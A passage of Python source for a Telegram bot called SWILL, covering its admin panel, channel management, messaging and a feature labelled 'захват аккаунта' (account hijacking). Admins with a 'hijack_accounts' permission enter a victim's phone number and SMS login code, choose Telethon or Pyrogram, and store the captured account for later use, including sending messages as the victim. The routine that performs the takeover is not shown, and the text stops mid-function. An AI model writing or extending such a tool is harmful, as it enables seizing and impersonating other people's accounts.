    # Состояния для рассылки
    waiting_broadcast_text = State()
    waiting_broadcast_confirm = State()
    
    # Состояния для настроек
    waiting_settings_action = State()
    waiting_proxy_url = State()
    waiting_security_level = State()

class UserStates(StatesGroup):
    waiting_verification = State()
    waiting_contact = State()
    waiting_feedback = State()

# ========== ФИЛЬТРЫ ДЛЯ ПРОВЕРКИ ПРАВ ==========
class AdminFilter(Filter):
    def __init__(self, require_main: bool = False, permission: str = None):
        self.require_main = require_main
        self.permission = permission
    
    async def __call__(self, message: Message, event_from_user: types.User) -> bool:
        user_id = event_from_user.id
        
        # Проверяем, является ли администратором
        if not admin_manager.is_admin(user_id):
            return False
        
        # Проверяем, требуется ли главный админ
        if self.require_main and not admin_manager.is_main_admin(user_id):
            return False
        
        # Проверяем конкретное разрешение
        if self.permission and not admin_manager.has_permission(user_id, self.permission):
            return False
        
        return True

# Создаем фильтры для разных уровней доступа
is_admin = AdminFilter()
is_main_admin = AdminFilter(require_main=True)
can_manage_admins = AdminFilter(permission='manage_admins')
can_manage_channels = AdminFilter(permission='manage_channels')
can_send_messages = AdminFilter(permission='send_messages')
can_hijack_accounts = AdminFilter(permission='hijack_accounts')

# ========== ОБРАБОТЧИКИ КОМАНД ==========

# Команда /start
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user = message.from_user
    
    await state.clear()
    
    # Регистрируем пользователя в базе
    db.execute('''
        INSERT OR IGNORE INTO users 
        (user_id, username, first_name, last_name, registered_date)
        VALUES (?, ?, ?, ?, ?)
    ''', (user.id, user.username, user.first_name, user.last_name, datetime.now().isoformat()))
    
    # Обновляем last_seen
    db.execute(
        "UPDATE users SET last_seen = ? WHERE user_id = ?",
        (datetime.now().isoformat(), user.id)
    )
    
    if admin_manager.is_admin(user.id):
        # Показать панель администратора
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
            ],
            [
                InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage"),
                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts")
            ],
            [
                InlineKeyboardButton(text="⚙️ Настройки", callback_data="admin_settings"),
                InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")
            ]
        ]) if admin_manager.is_main_admin(user.id) else InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="📨 Отправить сообщение", callback_data="admin_send_message"),
                InlineKeyboardButton(text="📢 Каналы", callback_data="admin_channels")
            ],
            [
                InlineKeyboardButton(text="👤 Аккаунты", callback_data="admin_accounts"),
                InlineKeyboardButton(text="📊 Моя статистика", callback_data="admin_my_stats")
            ]
        ])
        
        admin_type = "Главный администратор" if admin_manager.is_main_admin(user.id) else "Администратор"
        
        await message.answer(
            f"👑 <b>ПАНЕЛЬ АДМИНИСТРАТОРА SWILL</b>\n\n"
            f"👤 ID: <code>{user.id}</code>\n"
            f"🔑 Роль: {admin_type}\n"
            f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"<i>Выберите действие:</i>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        # Показать пользовательское меню
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="ℹ️ Информация", callback_data="user_info")],
            [InlineKeyboardButton(text="📞 Связаться", callback_data="user_contact")],
            [InlineKeyboardButton(text="🆘 Поддержка", callback_data="user_support")]
        ])
        
        await message.answer(
            f"👋 <b>Добро пожаловать, {user.first_name}!</b>\n\n"
            f"Я - бот SWILL. Чем могу помочь?",
            parse_mode="HTML",
            reply_markup=keyboard
        )

# Команда /admin - быстрый доступ к админке
@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет доступа к панели администратора.")
        return
    
    await cmd_start(message, None)

# ========== ОБРАБОТЧИКИ АДМИН-ПАНЕЛИ ==========

# Отправка сообщения пользователю
@dp.callback_query(F.data == "admin_send_message")
async def admin_send_message_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    await state.set_state(AdminStates.waiting_message_username)
    
    await callback_query.message.edit_text(
        "📨 <b>ОТПРАВКА СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ</b>\n\n"
        "Введите @username пользователя:\n"
        "<code>@username_user</code>\n\n"
        "<i>Или отправьте /cancel для отмены</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_message_username)
async def process_message_username(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    username = message.text.strip()
    
    if username == '/cancel':
        await message.answer("❌ Отправка сообщения отменена")
        await state.clear()
        return
    
    # Проверяем формат username
    if not username.startswith('@'):
        username = '@' + username
    
    await state.update_data(target_username=username)
    await state.set_state(AdminStates.waiting_message_text)
    
    await message.answer(
        f"✅ Получен username: {username}\n\n"
        "Теперь введите текст сообщения:\n\n"
        "<i>Поддерживается HTML разметка</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_message_text)
async def process_message_text(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    message_text = message.text
    
    if message_text == '/cancel':
        await message.answer("❌ Отправка сообщения отменена")
        await state.clear()
        return
    
    await state.update_data(message_text=message_text)
    
    user_data = await state.get_data()
    username = user_data.get('target_username', '')
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📎 Добавить медиа", callback_data="add_media"),
            InlineKeyboardButton(text="✅ Отправить", callback_data="send_message_now")
        ],
        [InlineKeyboardButton(text="✏️ Изменить текст", callback_data="edit_message_text")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_message")]
    ])
    
    await message.answer(
        f"📋 <b>ПРЕДПРОСМОТР СООБЩЕНИЯ</b>\n\n"
        f"👤 Кому: {username}\n"
        f"📝 Текст:\n"
        f"{message_text[:500]}{'...' if len(message_text) > 500 else ''}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "send_message_now")
async def send_message_now(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    username = user_data.get('target_username', '')
    message_text = user_data.get('message_text', '')
    media_path = user_data.get('media_path')
    
    await callback_query.message.edit_text(
        f"⏳ <b>Отправляю сообщение пользователю {username}...</b>",
        parse_mode="HTML"
    )
    
    # Отправляем сообщение
    result = await message_system.send_to_user_by_username(
        username,
        message_text,
        callback_query.from_user.id,
        media_path
    )
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>СООБЩЕНИЕ ОТПРАВЛЕНО!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"🆔 User ID: {result.get('user_id', 'неизвестно')}\n"
            f"📨 ID сообщения: {result.get('message_id', 'неизвестно')}\n"
            f"✅ Статус: {result.get('status', 'отправлено')}\n\n"
            f"<i>Для отправки нового сообщения используйте /start</i>",
            parse_mode="HTML"
        )
    else:
        error_msg = result.get('error', 'Неизвестная ошибка')
        status = result.get('status', 'error')
        
        status_text = {
            'user_not_found': 'Пользователь не найден',
            'user_blocked': 'Пользователь заблокировал бота',
            'privacy_restriction': 'Ограничения приватности',
            'error': 'Ошибка отправки'
        }.get(status, status)
        
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ОТПРАВКИ!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"📝 Статус: {status_text}\n"
            f"⚠️ Ошибка: {error_msg[:200]}\n\n"
            f"<i>Попробуйте еще раз или свяжитесь с пользователем другим способом.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление каналами
@dp.callback_query(F.data == "admin_channels")
async def admin_channels_menu(callback_query: CallbackQuery):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Получаем статистику каналов
    total_channels = db.fetch_one("SELECT COUNT(*) FROM channels")[0]
    approved_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 1")[0]
    active_channels = db.fetch_one("SELECT COUNT(*) FROM channels WHERE notifications_enabled = 1")[0]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить канал", callback_data="channel_add"),
            InlineKeyboardButton(text="📋 Список каналов", callback_data="channel_list")
        ],
        [
            InlineKeyboardButton(text="✅ Одобренные", callback_data="channel_approved"),
            InlineKeyboardButton(text="⏳ Ожидают", callback_data="channel_pending")
        ],
        [
            InlineKeyboardButton(text="🔔 Управление уведомлениями", callback_data="channel_notifications"),
            InlineKeyboardButton(text="📨 Рассылка", callback_data="channel_broadcast")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"📢 <b>УПРАВЛЕНИЕ КАНАЛАМИ</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего каналов: {total_channels}\n"
        f"• Одобрено: {approved_channels}\n"
        f"• Активны: {active_channels}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "channel_add")
async def channel_add_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    await state.set_state(AdminStates.waiting_channel_id)
    
    await callback_query.message.edit_text(
        "➕ <b>ДОБАВЛЕНИЕ КАНАЛА/ГРУППЫ</b>\n\n"
        "Отправьте ID или @username канала/группы:\n\n"
        "Формат:\n"
        "<code>@channel_username</code>\n"
        "<code>-1001234567890</code> (ID канала)\n\n"
        "<i>Перед добавлением убедитесь, что бот добавлен как администратор в канал.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_channel_id)
async def process_channel_id(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    channel_id = message.text.strip()
    
    if channel_id == '/cancel':
        await message.answer("❌ Добавление канала отменено")
        await state.clear()
        return
    
    await state.update_data(channel_id=channel_id)
    
    # Проверяем канал
    await message.answer(f"⏳ <b>Проверяю канал {channel_id}...</b>", parse_mode="HTML")
    
    try:
        # Пробуем получить информацию о канале
        chat = await bot.get_chat(channel_id)
        
        channel_info = {
            'title': chat.title,
            'username': chat.username,
            'type': str(chat.type)
        }
        
        # Проверяем права бота
        bot_is_admin = False
        try:
            member = await bot.get_chat_member(chat.id, (await bot.get_me()).id)
            bot_is_admin = member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
        except:
            pass
        
        await state.update_data(channel_info=channel_info, bot_is_admin=bot_is_admin)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Добавить", callback_data="confirm_channel_add"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_channel_add")
            ]
        ])
        
        await message.answer(
            f"🔍 <b>ИНФОРМАЦИЯ О КАНАЛЕ</b>\n\n"
            f"📢 Название: {chat.title}\n"
            f"🔗 ID: {chat.id}\n"
            f"👤 Username: @{chat.username or 'нет'}\n"
            f"📁 Тип: {chat.type}\n"
            f"🤖 Бот админ: {'✅ Да' if bot_is_admin else '❌ Нет'}\n\n"
            f"<i>Добавить этот канал в систему?</i>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
    except Exception as e:
        await message.answer(
            f"❌ <b>ОШИБКА ПРОВЕРКИ КАНАЛА</b>\n\n"
            f"Не удалось получить информацию о канале {channel_id}\n"
            f"Ошибка: {str(e)[:200]}\n\n"
            f"<i>Убедитесь, что:\n"
            f"1. Канал существует\n"
            f"2. Бот имеет доступ к каналу\n"
            f"3. Вы указали правильный ID/username</i>",
            parse_mode="HTML"
        )
        await state.clear()

@dp.callback_query(F.data == "confirm_channel_add")
async def confirm_channel_add(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    channel_id = user_data.get('channel_id')
    channel_info = user_data.get('channel_info', {})
    
    await callback_query.message.edit_text(
        f"⏳ <b>Добавляю канал {channel_id}...</b>",
        parse_mode="HTML"
    )
    
    result = await channel_manager.add_channel(
        channel_id,
        callback_query.from_user.id,
        channel_info
    )
    
    if result['success']:
        if result.get('requires_approval') and not admin_manager.is_main_admin(callback_query.from_user.id):
            await callback_query.message.edit_text(
                f"✅ <b>КАНАЛ ДОБАВЛЕН!</b>\n\n"
                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
                f"🔗 ID: {channel_id}\n"
                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
                f"📝 Статус: <b>ОЖИДАЕТ ОДОБРЕНИЯ</b>\n"
                f"Главный администратор получил уведомление и должен одобрить канал.\n\n"
                f"<i>Вы получите уведомление, когда канал будет одобрен.</i>",
                parse_mode="HTML"
            )
        else:
            await callback_query.message.edit_text(
                f"✅ <b>КАНАЛ ДОБАВЛЕН И ОДОБРЕН!</b>\n\n"
                f"📢 Канал: {channel_info.get('title', channel_id)}\n"
                f"🔗 ID: {channel_id}\n"
                f"🤖 Бот админ: {'✅ Да' if result.get('bot_is_admin') else '❌ Нет'}\n\n"
                f"✅ Статус: <b>ОДОБРЕН</b>\n"
                f"Теперь бот будет отправлять уведомления в этот канал.\n\n"
                f"<i>Для управления уведомлениями используйте меню каналов.</i>",
                parse_mode="HTML"
            )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ КАНАЛА</b>\n\n"
            f"Канал: {channel_id}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Попробуйте еще раз или проверьте правильность данных.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление админами
@dp.callback_query(F.data == "admin_manage")
async def admin_manage_menu(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может управлять админами")
        return
    
    # Получаем статистику админов
    total_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_active = 1")[0]
    main_admins = db.fetch_one("SELECT COUNT(*) FROM admins WHERE is_main_admin = 1 AND is_active = 1")[0]
    regular_admins = total_admins - main_admins
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add"),
            InlineKeyboardButton(text="➖ Удалить админа", callback_data="admin_remove_menu")
        ],
        [
            InlineKeyboardButton(text="📋 Список админов", callback_data="admin_list"),
            InlineKeyboardButton(text="🔧 Права админов", callback_data="admin_permissions")
        ],
        [
            InlineKeyboardButton(text="📊 Статистика админов", callback_data="admin_stats_list"),
            InlineKeyboardButton(text="🚪 Выход из всех сессий", callback_data="admin_logout_all")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"👥 <b>УПРАВЛЕНИЕ АДМИНИСТРАТОРАМИ</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего админов: {total_admins}\n"
        f"• Главных админов: {main_admins}\n"
        f"• Обычных админов: {regular_admins}\n"
        f"• Лимит: {config.MAX_ADMINS}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может добавлять админов")
        return
    
    await state.set_state(AdminStates.waiting_admin_username)
    
    await callback_query.message.edit_text(
        "➕ <b>ДОБАВЛЕНИЕ АДМИНИСТРАТОРА</b>\n\n"
        "Отправьте @username пользователя, которого хотите сделать админом:\n\n"
        "<code>@username_user</code>\n\n"
        "<i>Пользователь должен начать диалог с ботом (@BotFather) перед добавлением.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_admin_username)
async def process_admin_username(message: Message, state: FSMContext):
    if not admin_manager.is_main_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    username = message.text.strip()
    
    if username == '/cancel':
        await message.answer("❌ Добавление админа отменено")
        await state.clear()
        return
    
    # Проверяем формат username
    if not username.startswith('@'):
        username = '@' + username
    
    # Пытаемся найти пользователя
    await message.answer(f"⏳ <b>Ищу пользователя {username}...</b>", parse_mode="HTML")
    
    try:
        # Пробуем получить chat пользователя
        chat = await bot.get_chat(username)
        
        if chat.type != ChatType.PRIVATE:
            await message.answer(
                f"❌ <b>ЭТО НЕ ЛИЧНЫЙ АККАУНТ</b>\n\n"
                f"{username} - это {chat.type}, а не личный аккаунт.\n"
                f"Добавлять можно только личные аккаунты пользователей.",
                parse_mode="HTML"
            )
            await state.clear()
            return
        
        await state.update_data(
            new_admin_username=username,
            new_admin_user_id=chat.id,
            new_admin_first_name=chat.first_name,
            new_admin_last_name=chat.last_name
        )
        
        await state.set_state(AdminStates.waiting_admin_permissions)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="👑 Все права", callback_data="perms_all"),
                InlineKeyboardButton(text="📨 Только сообщения", callback_data="perms_messages")
            ],
            [
                InlineKeyboardButton(text="📢 Только каналы", callback_data="perms_channels"),
                InlineKeyboardButton(text="👤 Только аккаунты", callback_data="perms_accounts")
            ],
            [
                InlineKeyboardButton(text="🔧 Настроить вручную", callback_data="perms_custom"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")
            ]
        ])
        
        await message.answer(
            f"✅ <b>ПОЛЬЗОВАТЕЛЬ НАЙДЕН</b>\n\n"
            f"👤 Username: {username}\n"
            f"🆔 ID: {chat.id}\n"
            f"👤 Имя: {chat.first_name} {chat.last_name or ''}\n\n"
            f"<b>Выберите уровень прав для нового администратора:</b>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
    except Exception as e:
        await message.answer(
            f"❌ <b>ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН</b>\n\n"
            f"Не удалось найти пользователя {username}\n"
            f"Ошибка: {str(e)[:200]}\n\n"
            f"<i>Убедитесь, что:\n"
            f"1. Пользователь существует\n"
            f"2. Username указан правильно\n"
            f"3. Пользователь начинал диалог с ботом</i>",
            parse_mode="HTML"
        )
        await state.clear()

@dp.callback_query(F.data.startswith("perms_"))
async def process_admin_permissions(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    permission_type = callback_query.data.split("_")[1]
    
    permissions_map = {
        'all': 'all',
        'messages': 'send_messages,view_messages',
        'channels': 'manage_channels,view_channels',
        'accounts': 'hijack_accounts,manage_accounts,view_accounts'
    }
    
    permissions = permissions_map.get(permission_type, 'basic')
    
    if permission_type == 'custom':
        await callback_query.message.edit_text(
            "🔧 <b>НАСТРОЙКА ПРАВ ВРУЧНУЮ</b>\n\n"
            "Введите права через запятую:\n\n"
            "Доступные права:\n"
            "• send_messages - отправка сообщений\n"
            "• view_messages - просмотр сообщений\n"
            "• manage_channels - управление каналами\n"
            "• view_channels - просмотр каналов\n"
            "• hijack_accounts - захват аккаунтов\n"
            "• manage_accounts - управление аккаунтами\n"
            "• view_accounts - просмотр аккаунтов\n"
            "• manage_admins - управление админами (только главный админ)\n"
            "• view_logs - просмотр логов\n"
            "• all - все права\n\n"
            "<i>Пример: send_messages,view_messages,manage_channels</i>",
            parse_mode="HTML"
        )
        await state.set_state(AdminStates.waiting_admin_permissions)
        return
    
    await state.update_data(new_admin_permissions=permissions)
    await state.set_state(AdminStates.waiting_admin_confirm)
    
    user_data = await state.get_data()
    username = user_data.get('new_admin_username', '')
    user_id = user_data.get('new_admin_user_id', '')
    first_name = user_data.get('new_admin_first_name', '')
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Подтвердить", callback_data="confirm_admin_add"),
            InlineKeyboardButton(text="✏️ Изменить права", callback_data="change_admin_perms")
        ],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")]
    ])
    
    await callback_query.message.edit_text(
        f"📋 <b>ПОДТВЕРЖДЕНИЕ ДОБАВЛЕНИЯ</b>\n\n"
        f"👤 Пользователь: {username}\n"
        f"🆔 ID: {user_id}\n"
        f"👤 Имя: {first_name}\n"
        f"🔑 Права: {permissions}\n\n"
        f"<i>Добавить этого пользователя как администратора?</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "confirm_admin_add")
async def confirm_admin_add(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    username = user_data.get('new_admin_username', '')
    user_id = user_data.get('new_admin_user_id', '')
    permissions = user_data.get('new_admin_permissions', 'basic')
    
    await callback_query.message.edit_text(
        f"⏳ <b>Добавляю администратора {username}...</b>",
        parse_mode="HTML"
    )
    
    result = await admin_manager.add_admin(
        user_id,
        username,
        callback_query.from_user.id,
        permissions
    )
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>АДМИНИСТРАТОР ДОБАВЛЕН!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"🆔 ID: {user_id}\n"
            f"🔑 Права: {permissions}\n"
            f"👑 Добавил: ID {callback_query.from_user.id}\n\n"
            f"<i>Пользователь получил уведомление о назначении.</i>",
            parse_mode="HTML"
        )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ</b>\n\n"
            f"Пользователь: {username}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Попробуйте еще раз.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление захваченными аккаунтами
@dp.callback_query(F.data == "admin_accounts")
async def admin_accounts_menu(callback_query: CallbackQuery):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Проверяем права на работу с аккаунтами
    if not admin_manager.has_permission(callback_query.from_user.id, 'view_accounts'):
        await callback_query.answer("❌ У вас нет прав для просмотра аккаунтов")
        return
    
    # Получаем статистику аккаунтов
    total_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts")[0]
    active_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_active = 1")[0]
    online_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_online = 1")[0]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🎯 Захватить аккаунт", callback_data="account_hijack"),
            InlineKeyboardButton(text="📋 Список аккаунтов", callback_data="account_list")
        ],
        [
            InlineKeyboardButton(text="🔄 Восстановить все", callback_data="account_restore_all"),
            InlineKeyboardButton(text="📊 Статистика", callback_data="account_stats")
        ],
        [
            InlineKeyboardButton(text="📨 Отправить от аккаунта", callback_data="account_send"),
            InlineKeyboardButton(text="⚙️ Управление аккаунтами", callback_data="account_manage")
        ] if admin_manager.has_permission(callback_query.from_user.id, 'manage_accounts') else [],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"👤 <b>УПРАВЛЕНИЕ АККАУНТАМИ TELEGRAM</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего аккаунтов: {total_accounts}\n"
        f"• Активных: {active_accounts}\n"
        f"• Онлайн: {online_accounts}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "account_hijack")
async def account_hijack_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Проверяем права на захват аккаунтов
    if not admin_manager.has_permission(callback_query.from_user.id, 'hijack_accounts'):
        await callback_query.answer("❌ У вас нет прав для захвата аккаунтов")
        return
    
    # Проверяем, настроены ли API credentials
    if not config.TELEGRAM_API_ID or not config.TELEGRAM_API_HASH:
        await callback_query.message.edit_text(
            "❌ <b>API CREDENTIALS НЕ НАСТРОЕНЫ</b>\n\n"
            "Для захвата аккаунтов необходимо настроить:\n"
            "1. TELEGRAM_API_ID\n"
            "2. TELEGRAM_API_HASH\n\n"
            "Добавьте эти переменные в настройки бота.",
            parse_mode="HTML"
        )
        return
    
    await state.set_state(AdminStates.waiting_hijack_phone)
    
    await callback_query.message.edit_text(
        "🎯 <b>ЗАХВАТ АККАУНТА TELEGRAM</b>\n\n"
        "Отправьте номер телефона в международном формате:\n\n"
        "<code>+79123456789</code>\n\n"
        "<i>Номер должен быть привязан к аккаунту Telegram.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_hijack_phone)
async def process_hijack_phone(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
        await message.answer("❌ У вас нет прав для захвата аккаунтов")
        await state.clear()
        return
    
    phone = message.text.strip()
    
    if phone == '/cancel':
        await message.answer("❌ Захват аккаунта отменен")
        await state.clear()
        return
    
    # Проверяем формат номера
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            raise ValueError("Неверный номер телефона")
        
        formatted_phone = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
        
    except Exception as e:
        await message.answer(
            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА</b>\n\n"
            f"Номер: {phone}\n"
            f"Ошибка: {str(e)}\n\n"
            f"<i>Используйте международный формат:\n"
            f"+79123456789</i>",
            parse_mode="HTML"
        )
        return
    
    await state.update_data(hijack_phone=formatted_phone)
    await state.set_state(AdminStates.waiting_hijack_method)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 Telethon", callback_data="hijack_method_telethon"),
            InlineKeyboardButton(text="🤖 Pyrogram", callback_data="hijack_method_pyrogram")
        ],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_hijack")]
    ])
    
    await message.answer(
        f"✅ <b>НОМЕР ПРИНЯТ</b>\n\n"
        f"📱 Номер: {formatted_phone}\n\n"
        f"<b>Выберите метод захвата:</b>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("hijack_method_"))
async def process_hijack_method(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    method = callback_query.data.split("_")[2]  # telethon или pyrogram
    
    await state.update_data(hijack_method=method)
    await state.set_state(AdminStates.waiting_hijack_code)
    
    await callback_query.message.edit_text(
        f"🔢 <b>ВВОД КОДА ПОДТВЕРЖДЕНИЯ</b>\n\n"
        f"📱 Номер: {(await state.get_data()).get('hijack_phone', '')}\n"
        f"🔧 Метод: {method}\n\n"
        f"Отправьте код из SMS, который придет на этот номер:\n\n"
        f"<i>Код состоит из 5-6 цифр.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_hijack_code)
async def process_hijack_code(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
        await message.answer("❌ У вас нет прав для захвата аккаунтов")
        await state.clear()
        return
    
    code = message.text.strip()
    
    if code == '/cancel':
        await message.answer("❌ Захват аккаунта отменен")
        await state.clear()
        return
    
    # Проверяем формат кода
    if not code.isdigit() or len(code) < 5 or len(code) > 6:
        await message.answer(
            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОДА</b>\n\n"
            f"Код должен состоять из 5-6 цифр.\n"
            f"Получено: {code}\n\n"
            f"<i>Попробуйте еще раз.</i>",
            parse_mode="HTML"
        )
        return
    
    user_data = await state.get_data()
    phone = user_data.get('hijack_phone', '')
    method = user_data.get('hijack_method', 'telethon')
    
    await message.answer(
        f"⏳ <b>НАЧИНАЮ ЗАХВАТ АККАУНТА...</b>\n\n"
        f"📱 Номер: {phone}\n"
        f"🔢 Код: {code}\n"
        f"🔧 Метод: {method}\n\n"
        f"<i>Это может занять несколько секунд...</i>",
        parse_mode="HTML"
    )
    
    # Запускаем захват аккаунта
    result = await account_manager.hijack_account(phone, code, method)
    
    if result['success']:
        account_id = result['account_id']
        
        # Получаем подробную информацию об аккаунте
        account_info = await account_manager.get_account_info(account_id)
        
        await message.answer(
            f"✅ <b>АККАУНТ УСПЕШНО ЗАХВАЧЕН!</b>\n\n"
            f"📱 Номер: {phone}\n"
            f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
            f"🆔 User ID: {account_info.get('user_id', 'неизвестно')}\n"
            f"👤 Имя: {account_info.get('first_name', 'неизвестно')}\n"
            f"🔧 Метод: {method}\n"
            f"🎯 ID аккаунта: {account_id}\n\n"
            f"<i>Аккаунт добавлен в систему и готов к использованию.</i>",
